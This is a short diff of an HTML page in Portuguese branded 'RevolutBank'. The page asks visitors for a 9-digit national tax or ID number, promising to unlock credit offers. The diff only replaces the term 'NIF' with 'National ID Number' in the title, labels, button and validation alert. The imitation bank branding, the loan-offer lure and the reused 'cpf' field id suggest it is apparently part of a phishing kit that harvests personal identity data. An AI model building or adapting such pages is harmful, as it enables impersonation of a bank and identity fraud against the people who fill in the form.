@@ -21,7 +21,7 @@
 
 <meta charset="utf-8"/>
 <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-<title>RevolutBank – Verificação de NIF</title>
+<title>RevolutBank – Verificação de National ID Number</title>
 <style>
     @import url("https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&amp;family=Outfit:wght@400;500;600;700;800&amp;family=Sora:wght@600;700;800&amp;family=Plus+Jakarta+Sans:wght@400;500;600;700;800&amp;family=Poppins:wght@400;500;600;700&amp;display=swap");
 
@@ -956,7 +956,7 @@
 <div class="step-indicators" id="stepIndicators">
 <div class="step-dot active" id="ind1">
 <div class="dot">1</div>
-<span class="dot-label">NIF</span>
+<span class="dot-label">National ID Number</span>
 </div>
 <div class="step-line" id="line1"></div>
 <div class="step-dot" id="ind2">
@@ -993,14 +993,14 @@
 </div>
 <h1><span data-msg="step2.t02">Vamos começar!</span></h1>
 </div>
-<p class="step-subtitle"><span data-msg="step2.t03">Indique o seu NIF para verificarmos os seus dados e libertar as melhores ofertas de crédito disponíveis para si.</span></p>
+<p class="step-subtitle"><span data-msg="step2.t03">Indique o seu National ID Number para verificarmos os seus dados e libertar as melhores ofertas de crédito disponíveis para si.</span></p>
 <form id="step1Form">
 <div class="form-group">
-<label><span data-msg="step2.t04">Seu NIF</span></label>
+<label><span data-msg="step2.t04">Seu National ID Number</span></label>
 <input id="cpf" inputmode="numeric" maxlength="11" placeholder="123 456 789" required="" type="tel"/>
 </div>
 <button class="btn btn-primary" id="submitBtn1" type="submit">
-<span class="btn-text"><span data-msg="step2.t05">Verificar o meu NIF</span></span>
+<span class="btn-text"><span data-msg="step2.t05">Verificar o meu National ID Number</span></span>
 <span class="spinner"></span>
 </button>
 </form>
@@ -1147,7 +1147,7 @@
       const btn = document.getElementById('submitBtn1');
 
       if (nif.length !== 9) {
-        alert('NIF inválido. Indique 9 dígitos.');
+        alert('National ID Number inválido. Indique 9 dígitos.');
         return;
       }
 
